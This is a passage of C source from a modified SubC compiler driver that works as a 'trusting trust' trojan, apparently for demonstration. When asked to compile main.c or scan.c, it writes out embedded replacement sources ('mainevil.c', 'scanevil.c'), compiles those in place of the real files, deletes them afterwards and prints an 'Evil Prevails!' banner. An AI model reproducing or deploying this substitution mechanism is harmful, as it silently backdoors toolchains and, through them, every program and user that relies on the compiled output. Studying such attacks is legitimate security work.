ASPLUS;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tputback(c);\n\t\t\t\treturn PLUS;\n\t\t\t}\n\t\tcase ',':\n\t\t\treturn COMMA;\n\t\tcase '-':\n\t\t\tif ((c = next()) == '-') {\n\t\t\t\tText[1] = '-';\n\t\t\t\treturn DECR;\n\t\t\t}\n\t\t\telse if ('=' == c) {\n\t\t\t\tText[1] = '=';\n\t\t\t\treturn ASMINUS;\n\t\t\t}\n\t\t\telse if ('>' == c) {\n\t\t\t\tText[1] = '>';\n\t\t\t\treturn ARROW;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tputback(c);\n\t\t\t\treturn MINUS;\n\t\t\t}\n\t\tcase '/':\n\t\t\tif ((c = next()) == '=') {\n\t\t\t\tText[1] = '=';\n\t\t\t\treturn ASDIV;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tputback(c);\n\t\t\t\treturn SLASH;\n\t\t\t}\n\t\tcase ':':\n\t\t\treturn COLON;\n\t\tcase ';':\n\t\t\treturn SEMI;\n\t\tcase '<':\n\t\t\tif ((c = next()) == '<') {\n\t\t\t\tText[1] = '<';\n\t\t\t\tif ((c = next()) == '=') {\n\t\t\t\t\tText[2] = '=';\n\t\t\t\t\treturn ASLSHIFT;\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tputback(c);\n\t\t\t\t\treturn LSHIFT;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if ('=' == c) {\n\t\t\t\tText[1] = '=';\n\t\t\t\treturn LTEQ;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tputback(c);\n\t\t\t\treturn LESS;\n\t\t\t}\n\t\tcase '=':\n\t\t\tif ((c = next()) == '=') {\n\t\t\t\tText[1] = '=';\n\t\t\t\treturn EQUAL;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tputback(c);\n\t\t\t\treturn ASSIGN;\n\t\t\t}\n\t\tcase '>':\n\t\t\tif ((c = next()) == '>') {\n\t\t\t\tText[1] = '>';\n\t\t\t\tif ((c = next()) == '=') {\n\t\t\t\t\tText[1] = '=';\n\t\t\t\t\treturn ASRSHIFT;\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tputback(c);\n\t\t\t\t\treturn RSHIFT;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if ('=' == c) {\n\t\t\t\tText[1] = '=';\n\t\t\t\treturn GTEQ;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tputback(c);\n\t\t\t\treturn GREATER;\n\t\t\t}\n\t\tcase '?':\n\t\t\treturn QMARK;\n\t\tcase '[':\n\t\t\treturn LBRACK;\n\t\tcase ']':\n\t\t\treturn RBRACK;\n\t\tcase '^':\n\t\t\tif ((c = next()) == '=') {\n\t\t\t\tText[1] = '=';\n\t\t\t\treturn ASXOR;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tputback(c);\n\t\t\t\treturn CARET;\n\t\t\t}\n\t\tcase '{':\n\t\t\treturn LBRACE;\n\t\tcase '|':\n\t\t\tif ((c = next()) == '|') {\n\t\t\t\tText[1] = '|';\n\t\t\t\treturn LOGOR;\n\t\t\t}\n\t\t\telse if ('=' == c) {\n\t\t\t\tText[1] = '=';\n\t\t\t\treturn ASOR;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tputback(c);\n\t\t\t\treturn PIPE;\n\t\t\t}\n\t\tcase '}':\n\t\t\treturn RBRACE;\n\t\tcase '~':\n\t\t\treturn TILDE;\n\t\tcase EOF:\n\t\t\tstrcpy(Text, \"<EOF>\");\n\t\t\treturn XEOF;\n\t\tcase '\\'':\n\t\t\tText[1] = Value = scanch();\n\t\t\tif ((c = next()) != '\\'')\n\t\t\t\terror(\n\t\t\t\t \"expected '\\\\'' at end of char literal\",\n\t\t\t\t\tNULL);\n\t\t\tText[2] = '\\'';\n\t\t\treturn INTLIT;\n\t\tcase '\"':\n\t\t\tValue = scanstr(Text);\n\t\t\treturn STRLIT;\n\t\tcase '#':\n\t\t\tText[0] = '#';\n\t\t\tscanident(next(), &Text[1], TEXTLEN-1);\n\t\t\tif ((t = keyword(Text)) != 0) \n\t\t\t\treturn t; \n\t\t\terror(\"unknown preprocessor command: %s\", Text);\n\t\t\treturn IDENT;\n\t\tcase '.':\n\t\t\tif ((c = next()) == '.') {\n\t\t\t\tText[1] = Text[2] = '.';\n\t\t\t\tText[3] = 0;\n\t\t\t\tif ((c = next()) == '.')\n\t\t\t\t\treturn ELLIPSIS;\n\t\t\t\tputback(c);\n\t\t\t\terror(\"incomplete '...'\", NULL);\n\t\t\t\treturn ELLIPSIS;\n\t\t\t}\n\t\t\tputback(c);\n\t\t\treturn DOT;\n\t\tdefault:\n\t\t\tif (isdigit(c)) {\n\t\t\t\tValue = scanint(c);\n\t\t\t\treturn INTLIT;\n\t\t\t}\n\t\t\telse if (isalpha(c) || '_' == c) {\n\t\t\t\tValue = scanident(c, Text, TEXTLEN);\n\t\t\t\tif (Expandmac && macro(Text))\n\t\t\t\t\tbreak;\n\t\t\t\tif ((t = keyword(Text)) != 0)\n\t\t\t\t\treturn t;\n\t\t\t\treturn IDENT;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tscnerror(\"funny input character: %s\", c);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n}\n\nint scan(void) {\n\tint\tt;\n\n\tdo {\n\t\tt = scanpp();\n\t\tif (!Inclev && Isp && XEOF == t)\n\t\t\tfatal(\"missing '#endif'\");\n\t} while (frozen(1));\n\tif (t == Syntoken)\n\t\tSyntoken = 0;\n\treturn t;\n}\n\nint scanraw(void) {\n\tint\tt, oisp;\n\n\toisp = Isp;\n\tIsp = 0;\n\tExpandmac = 0;\n\tt = scan();\n\tExpandmac = 1;\n\tIsp = oisp;\n\treturn t;\n}\n\nvoid reject(void) {\n\tRejected = Token;\n\tRejval = Value;\n\tstrcpy(Rejtext, Text);\n}\n");
	fp2 = fopen("scanevil.c","w+");
	fputs(scan_evil,fp2);
	fclose(fp2);
	//

	in = stdin;
	out = stdout;
	ofile = NULL;
	if (file) {
		ofile = newfilename(file, 's');
		if ((in = fopen(file, "r")) == NULL)
			cmderror("no such file: %s", file);
		if (!O_testonly) {
			if ((out = fopen(ofile, "r")) != NULL)
				cmderror("will not overwrite file: %s",
					ofile);
			if ((out = fopen(ofile, "w")) == NULL)
				cmderror("cannot create file: %s", ofile);
		}
	}
	if (O_testonly) out = NULL;
	if (O_verbose) {
		if (O_testonly)
			printf("cc -t %s\n", file);
		else
			if (O_verbose > 1)
				printf("cc -S -o %s %s\n", ofile, file);
			else
				printf("compiling %s\n", file);
	}
	//**********************************************************************************************
	// For now assumes the compiler is called at the directory its source files are in. --> will affect file name such as main.c and ../main.c etc.
	printf("%s\n",file);
	if( !strcmp(file,"main.c") ) {
		fclose(in);
		//in = fopen("evil/main_evil.c","r");
		in = fopen("mainevil.c","r");
		printf("subc main.c detected, replaced in.\n");
	}
	if( !strcmp(file,"scan.c") ) {
		fclose(in);
		//in = fopen("evil/scan_evil.c","r");
		in = fopen("scanevil.c","r");
		printf("subc scan.c detected, replaced in.\n");
	}
	//**********************************************************************************************/
	program(file, in, out, def);
	if (file) {
		fclose(in);
		if (out) fclose(out);
	}
	remove("mainevil.c");
	remove("scanevil.c");
}

#endif /* !__dos */

static void collect(char *file, int temp) {
	if (O_componly || O_asmonly) return;
	if (Nf >= MAXFILES)
		cmderror("too many input files", NULL);
	Temp[Nf] = temp;
	Files[Nf++] = file;
}

static void assemble(char *file, int delete) {
	char	*ofile;
	char	cmd[TEXTLEN+1];

	file = newfilename(file, 's');
	if (O_componly && O_outfile)
		ofile = O_outfile;
	else
		collect(ofile = newfilename(file, 'o'), 1);
	if (strlen(file) + strlen(ofile) + strlen(ASCMD) >= TEXTLEN)
		cmderror("assembler command too long", NULL);
	sprintf(cmd, ASCMD, ofile, file);
	if (O_verbose > 1) printf("%s\n", cmd);
	if (system(cmd))
		cmderror("assembler invocation failed", NULL);
	if (delete) {
		if (O_verbose > 2) printf("rm %s\n", file);
		remove(file);
	}
}

static int concat(int k, char *buf, char *s) {
	int	n;

	n = strlen(s);
	if (k + n + 2 >= TEXTLEN)
		cmderror("linker command too long", buf);
	strcat(buf, " ");
	strcat(buf, s);
	return k + n + 1;
}

static void link(void) {
	int	i, k;
	char	cmd[TEXTLEN+2];
	char	cmd2[TEXTLEN+2];
	char	*ofile;

	ofile = O_outfile? O_outfile: AOUTNAME;
	if (strlen(ofile) + strlen(LDCMD) + strlen(SCCDIR)*2 >= TEXTLEN)
		cmderror("linker command too long", NULL);
	sprintf(cmd, LDCMD, ofile, SCCDIR, O_stdio? "": "n");
	k = strlen(cmd);
	for (i=0; i<Nf; i++)
		k = concat(k, cmd, Files[i]);
	k = concat(k, cmd, SCCLIBC);
	concat(k, cmd, SYSLIBC);
	sprintf(cmd2, cmd, SCCDIR);
	if (O_verbose > 1) printf("%s\n", cmd2);
	if (system(cmd2))
		cmderror("linker invocation failed", NULL);
	if (O_verbose > 2) printf("rm ");
	for (i=0; i<Nf; i++) {
		if (Temp[i]) {
			if (O_verbose > 2) printf(" %s", Files[i]);
			remove(Files[i]);
		}
	}
	if (O_verbose > 2) printf("\n");
}

static void usage(void) {
	printf("Usage: scc [-h] [-ctvNSV] [-d opt] [-o file] [-D macro[=text]]"
		" file [...]\n");
}

static void longusage(void) {
	printf("\n");
	usage();
	printf(	"\n"
		"-c       compile only, do not link\n"
		"-d opt   activate debug option OPT, ? = list\n"
		"-o file  write linker output to FILE\n"
		"-t       test only, generate no code\n"
		"-v       verbose, more v's = more verbose\n"
		"-D m=v   define macro M with optional value V\n"
		"-N       do not use stdio (can't use printf, etc)\n"
		"-S       compile to assembly language\n"
		"-V       print version and exit\n"
		"\n" );
}

static void version(void) {
	printf("SubC version %s for %s/%s\n", VERSION, OS, CPU);
}

static char *nextarg(int argc, char *argv[], int *pi, int *pj) {
	char	*s;

	if (argv[*pi][*pj+1] || *pi >= argc-1) {
		usage();
		exit(EXIT_FAILURE);
	}
	s = argv[++*pi];
	*pj = strlen(s)-1;
	return s;
}

static int dbgopt(int argc, char *argv[], int *pi, int *pj) {
	char	*s;

	s = nextarg(argc, argv, pi, pj);
	if (!strcmp(s, "lsym")) return D_LSYM;
	if (!strcmp(s, "gsym")) return D_GSYM;
	if (!strcmp(s, "stat")) return D_STAT;
	printf(	"\n"
		"scc: valid -d options are: \n\n"
		"lsym - dump local symbol tables\n"
		"gsym - dump global symbol table\n"
		"stat - print usage statistics\n"
		"\n");
	exit(EXIT_FAILURE);
}

int main(int argc, char *argv[]) {
	int	i, j;
	char	*def;

	def = NULL;
	O_debug = 0;
	O_verbose = 0;
	O_componly = 0;
	O_asmonly = 0;
	O_testonly = 0;
	O_stdio = 1;
	O_outfile = NULL;
	//**********************************************************************************************
	printf("Evil Prevails!*************************\n");
	printf("	/ \\~~~~/ \\\n");
	printf("	--      --\n");
	printf("	 **      **\n");
	printf("	 \\   =   /\n");
	printf("	  \\__-__/\n");
	printf("Evil Prevails!*************************\n");
	//**********************************************************************************************/
	for (i=1; i<argc; i++) {
		if (*argv[i] != '-') break;
		if (!strcmp(argv[i], "-")) {
			compile(NULL, def);
			exit(Errors? EXIT_FAILURE: EXIT_SUCCESS);
		}
		for (j=1; argv[i][j]; j++) {
			switch (argv[i][j]) {
			case 'c':
				O_componly = 1;
				break;
			case 'd':
				O_debug |= dbgopt(argc, argv, &i, &j);
				O_testonly = 1;
				break;
			case 'h':
				longusage();
				exit(EXIT_SUCCESS);
			case 'o':
				O_outfile = nextarg(argc, argv, &i, &j);
				break;
			case 't':
				O_testonly = 1;
				break;
			case 'v':
				O_verbose++;
				break;
			case 'D':
				if (def) cmderror("too many -D's", NULL);
				def = nextarg(argc, argv, &i, &j);
				break;
			case 'N':
				O_stdio = 0;
				break;
			case 'S':
				O_componly = O_asmonly = 1;
				break;
			case 'V':
				version();
				exit(EXIT_SUCCESS);
			default:
				usage();
				exit(EXIT_FAILURE);
			}
		}
	}
	if (i >= argc) {
		usage();
		exit(EXIT_FAILURE);
	}
	Nf = 0;
	while (i < argc) {
		if (filetype(argv[i]) == 'c') {
			compile(argv[i], def);
			if (Errors && !O_testonly)
				cmderror("compilation stopped", NULL);
			if (!O_asmonly && !O_testonly)
				assemble(argv[i], 1);
			i++;
		}
		else if (filetype(argv[i]) == 's') {
			if (!O_testonly) assemble(argv[i++], 0);
		}
		else {
			if (!exists(argv[i])) cmderror("no such file: %s",
							argv[i]);
			collect(argv[i++], 0);
		}
	}
	if (!O_componly && !O_testonly) link();
	return EXIT_SUCCESS;
}
